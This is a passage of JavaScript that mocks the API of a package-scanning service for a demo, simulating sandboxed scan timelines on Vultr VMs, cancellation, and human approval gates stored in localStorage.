    if (ap && ap.state === 'pending' && now() > ap.expires_at) { ap.state = 'expired'; ap.decided_at = ap.expires_at; save(s); }
    if (ap && ap.state === 'pending') elapsed = Math.min(elapsed, sc.gate.at);
    if (ap && ap.state !== 'pending') decision = ap.state === 'approved' ? 'approved' : 'rejected';
  }
  if (rec.cancelledAt != null) elapsed = Math.min(elapsed, rec.cancelledAt);
  const events = sc.timeline
    .filter(e => e.at <= elapsed && (!e.when || e.when === decision))
    .sort((a, b) => a.at - b.at)
    .map((e, i) => ({ id: i + 1, t: Math.round(e.at * 10) / 10, stage: e.stage, msg: e.msg, data: e.data || {} }));
  // like the server, a cancelled scan reports that its VM was destroyed
  if (rec.cancelledAt != null && events.some(e => e.data.vm) && !events.some(e => e.data.vm === 'destroyed')) {
    events.push({ id: events.length + 1, t: Math.round(rec.cancelledAt * 10) / 10, stage: 'destroy', msg: 'Vultr VM destroyed', data: { vm: 'destroyed', vm_report: { vm_id: VMID, destroyed: true } } });
  }
  let status = elapsed < 0.2 ? 'queued' : 'running', report = null, error = null, finished = null;
  if (rec.cancelledAt != null) { status = 'cancelled'; error = 'cancelled by user'; finished = started + rec.cancelledAt; }
  else if (elapsed >= sc.end) {
    finished = started + sc.end;
    if (sc.failed) { status = 'failed'; error = sc.failed; } else { status = 'done'; report = sc.report; }
  }
  const last = events.filter(e => typeof e.data.vm !== 'string' || e.stage === 'destroy').pop();
  const lifecycle = events.map(e => e.data.lifecycle).filter(Boolean).pop() || null;
  return { id: rec.id, source: rec.source, status, stage: last?.stage || null, created: rec.createdAt, finished, verdict: report?.verdict || null,
    error, report, lifecycle, sandbox_mode: 'vultr', events: events.filter(e => e.id > after), stages: STAGES };
}

// ---------------------------------------------------------------- the same calls api.js makes against the live API
export function list() {
  return db().scans.slice().sort((a, b) => b.createdAt - a.createdAt).map(r => {
    const { id, source, status, stage, created, finished, verdict, error } = materialize(r);
    return { id, source, status, stage, created, finished, verdict, error };
  });
}

export function get(id, after = 0) {
  const rec = db().scans.find(s => s.id === id);
  if (!rec) { const e = new Error('No such scan'); e.status = 404; throw e; }
  return materialize(rec, after);
}

export function create({ source, file }) {
  const src = file ? `upload:${file.name}` : (source || '').trim();
  if (!src) { const e = new Error('Give an npm package name, a GitHub URL, or upload a file'); e.status = 400; throw e; }
  const id = Math.random().toString(16).slice(2, 12).padEnd(10, '0');
  const s = db();
  s.scans.push({ id, scenario: pickScenario(src), source: src, createdAt: now() });
  save(s);
  return { id };
}

export function cancel(id) {
  const s = db(); const rec = s.scans.find(r => r.id === id);
  if (!rec) { const e = new Error('No such scan'); e.status = 404; throw e; }
  if (!['queued', 'running'].includes(materialize(rec).status)) { const e = new Error('Scan is not running'); e.status = 409; throw e; }
  rec.cancelledAt = now() - rec.createdAt - (rec.shift || 0);
  const ap = s.approvals.find(a => a.scan_id === id && a.state === 'pending');
  if (ap) { ap.state = 'expired'; ap.decided_at = now(); }
  save(s);
  return { id, cancelling: true };
}

/** Demo only: the live API has no approvals list or log yet. */
export function approvals() {
  const s = db();
  s.scans.forEach(r => materialize(r)); // creates and expires gate approvals as time passes
  return { pending: s.approvals.filter(a => a.state === 'pending'), log: s.approvals.filter(a => a.state !== 'pending').sort((a, b) => b.decided_at - a.decided_at) };
}

export function decide(id, decision) {
  const s = db(); const ap = s.approvals.find(a => a.id === id);
  if (!ap || ap.state !== 'pending') { const e = new Error('This approval is no longer pending'); e.status = 409; throw e; }
  ap.state = decision === 'approve' ? 'approved' : 'rejected'; ap.decided_by = 'you'; ap.decided_at = now();
  const rec = s.scans.find(r => r.id === ap.scan_id);
  if (rec) {
    const sc = SCENARIOS[rec.scenario](rec.source, rec.id);
    if (sc.gate) rec.shift = (now() - rec.createdAt) - sc.gate.at; // resume the timeline from the gate
  }
  save(s);
  return ap;
}

export function reset() { localStorage.removeItem(KEY); store = null; }
